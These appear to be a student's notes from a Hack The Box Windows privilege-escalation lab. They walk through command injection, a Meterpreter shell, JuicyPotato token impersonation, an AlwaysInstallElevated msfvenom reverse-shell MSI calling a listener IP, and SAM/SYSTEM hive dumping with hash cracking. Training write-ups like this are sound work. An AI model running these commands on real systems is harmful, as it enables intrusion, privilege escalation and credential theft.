


The two KBs:
3199986&3200970

The site has an obvious command injection with local rce


`0.0.0.0 && whoami`

`iis apppool\defaultapppool`

We are part of Microsoft Internet Information Services web server, a virtual account, so there is some isolation involved. 

`0.0.0.0 && rundll32.exe `

We open a meterpreter shell, I used `smb_delivery`. Takes a while but we get a persistent shell.

## Enumeration
``
```
Computer        : WINLPE-SKILLS1-
OS              : Windows Server 2016 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
```

It's not domain joined.

```
Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```
`use post/multi/recon/local_exploit/suggester`


`SeImpersonatePrivilege`! We can do a token impersonation attack. An example is JuicyPotato (MS16-075). We need to enumerate for a COM service running as SYSTEM. Let's try to enumerate this.

(ms16_075_reflection and ms16_075_reflection_juicy) require you to specify a working CLSID from the ohpe/juicy-potato repo.

`reg query HKCR\CLSID /s /f LocalService`

->
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}

The exploit uses Net-NTLM reflection via a COM server identified by a CLSID to steal a SYSTEM token.

What I noticed here is you actually need to map this to the running process rather than the system, the system is x64 but the process is 32 bit because of its nature of iim, so we can use x86 process.

We then use lazagne for post exploit password recovery, finding the ldapadmin password


On another device, we already have local rdp. We do a quick enumeration to find left behind passwords.






# P2

We already have RDP.
Some basic enumeration we take note of the users that exist.

I used winPeas, found leftover password.

I also find a low hanging fruit:
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
  
HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
    AlwaysInstallElevated    REG_DWORD    0x1  
  
PS C:\Users\htb-student> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  
  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  
  
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer  
    AlwaysInstallElevated    REG_DWORD    0x1
    
```
I was lucky to find this during enumeration. I can easily create a malicious msi package and execute it to gain elevated reverse shell: 

`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.150 lport=9443 -f msi > aie.msi`
` msiexec /i C:\users\htb-student\desktop\aie.msi /quiet/qn /norestart`



There is another disabled user that we must retrieve the NTLM hash for.

In the winPEAS enum, it is the wksadmin

`reg.exe save hklm\sam C:\sam.save`

`reg.exe save hklm\system C:\system.save`
`reg.exe save hklm\security C:\security.save`

`python3.12 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
`python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
	hashcat -m 1000 5835048ce94ad0564e29a924a03510ef /usr/share/wordlists/rockyou.txt 